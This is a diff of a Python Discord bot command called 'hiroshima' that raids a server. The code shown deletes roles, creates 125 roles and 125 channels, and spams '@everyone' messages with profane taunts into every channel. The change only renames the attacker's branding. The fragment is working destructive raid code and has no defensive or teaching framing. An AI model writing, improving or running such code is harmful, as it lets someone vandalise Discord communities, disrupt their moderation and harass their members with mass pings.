@@ -39,15 +39,15 @@ async def hiroshima(ctx):
             print("  DELETING ROLES: FAILED")
     for _i in range(125):
         try:
-            await ctx.guild.create_role(name="Fucked By LoveLace.")
+            await ctx.guild.create_role(name="Wyld Beamed You Bozo")
         except:
             print("  CREATING ROLES: FAILED")
     for _i in range(125):
-        await ctx.guild.create_text_channel(name="Fucked By LoveLace.")
+        await ctx.guild.create_text_channel(name="Wyld W.")
     for channel in list(ctx.guild.channels):
         for _i in range(5):
             try:
-                await channel.send("@everyone Server Just Got Fucked By Lovelace.")  
+                await channel.send("@everyone Server Just Got Fucked By Wyld Gang")  
             except:
                 print("  CREATING ROLES: FAILED")  
 
